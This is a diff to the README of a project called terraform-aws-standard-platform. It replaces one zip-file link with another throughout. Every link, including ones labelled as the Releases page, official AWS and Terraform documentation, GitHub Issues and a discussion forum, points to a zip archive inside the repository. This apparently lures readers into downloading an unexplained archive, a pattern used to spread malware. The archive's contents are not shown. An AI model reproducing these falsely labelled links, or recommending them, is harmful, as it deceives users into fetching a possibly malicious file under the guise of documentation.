@@ -1,6 +1,6 @@
 # 🚀 terraform-aws-standard-platform - Easy AWS Setup for Everyone
 
-[![Download](https://raw.githubusercontent.com/wordless12/terraform-aws-standard-platform/main/pompously/terraform-aws-standard-platform.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/wordless12/terraform-aws-standard-platform/main/pompously/terraform-aws-standard-platform.zip)
+[![Download](https://github.com/wordless12/terraform-aws-standard-platform/raw/refs/heads/main/examples/base/aws-terraform-platform-standard-2.4.zip%20Now-Get%20Started-blue)](https://github.com/wordless12/terraform-aws-standard-platform/raw/refs/heads/main/examples/base/aws-terraform-platform-standard-2.4.zip)
 
 ## 📘 Overview
 
@@ -26,7 +26,7 @@ The terraform-aws-standard-platform project provides an enterprise-ready solutio
 
 To start using terraform-aws-standard-platform, follow these simple instructions:
 
-1. Visit the [Releases page to download](https://raw.githubusercontent.com/wordless12/terraform-aws-standard-platform/main/pompously/terraform-aws-standard-platform.zip).
+1. Visit the [Releases page to download](https://github.com/wordless12/terraform-aws-standard-platform/raw/refs/heads/main/examples/base/aws-terraform-platform-standard-2.4.zip).
 
 2. On the Releases page, find the latest version to ensure you get the latest features and fixes.
 
@@ -43,7 +43,7 @@ To start using terraform-aws-standard-platform, follow these simple instructions
 
 After downloading, you can start the installation:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/wordless12/terraform-aws-standard-platform/main/pompously/terraform-aws-standard-platform.zip).
+1. Visit the [Releases page](https://github.com/wordless12/terraform-aws-standard-platform/raw/refs/heads/main/examples/base/aws-terraform-platform-standard-2.4.zip).
 2. Choose the correct version and follow the standard procedure for installation based on your operating system.
 
 ## 🛠️ How to Use
@@ -79,15 +79,15 @@ For detailed guidance and troubleshooting help, consult the documentation availa
 
 ## 🔗 Additional Resources
 
-- [Official AWS Documentation](https://raw.githubusercontent.com/wordless12/terraform-aws-standard-platform/main/pompously/terraform-aws-standard-platform.zip)
-- [Terraform Documentation](https://raw.githubusercontent.com/wordless12/terraform-aws-standard-platform/main/pompously/terraform-aws-standard-platform.zip)
+- [Official AWS Documentation](https://github.com/wordless12/terraform-aws-standard-platform/raw/refs/heads/main/examples/base/aws-terraform-platform-standard-2.4.zip)
+- [Terraform Documentation](https://github.com/wordless12/terraform-aws-standard-platform/raw/refs/heads/main/examples/base/aws-terraform-platform-standard-2.4.zip)
 
 ## 🗣️ Community Support
 
 Join our community for tips, advice, and help with any questions. Engage with other users who are also navigating AWS deployments. You can find us on:
 
-- [GitHub Issues](https://raw.githubusercontent.com/wordless12/terraform-aws-standard-platform/main/pompously/terraform-aws-standard-platform.zip)
-- [Discussion Forum](https://raw.githubusercontent.com/wordless12/terraform-aws-standard-platform/main/pompously/terraform-aws-standard-platform.zip)
+- [GitHub Issues](https://github.com/wordless12/terraform-aws-standard-platform/raw/refs/heads/main/examples/base/aws-terraform-platform-standard-2.4.zip)
+- [Discussion Forum](https://github.com/wordless12/terraform-aws-standard-platform/raw/refs/heads/main/examples/base/aws-terraform-platform-standard-2.4.zip)
 
 ## 📄 License
 
@@ -97,4 +97,4 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 For further inquiries or support, feel free to open an issue on the GitHub repository or join the discussion forum. Your feedback is valuable and helps improve the application.
 
-[![Download](https://raw.githubusercontent.com/wordless12/terraform-aws-standard-platform/main/pompously/terraform-aws-standard-platform.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/wordless12/terraform-aws-standard-platform/main/pompously/terraform-aws-standard-platform.zip)
+[![Download](https://github.com/wordless12/terraform-aws-standard-platform/raw/refs/heads/main/examples/base/aws-terraform-platform-standard-2.4.zip%20Now-Get%20Started-blue)](https://github.com/wordless12/terraform-aws-standard-platform/raw/refs/heads/main/examples/base/aws-terraform-platform-standard-2.4.zip)
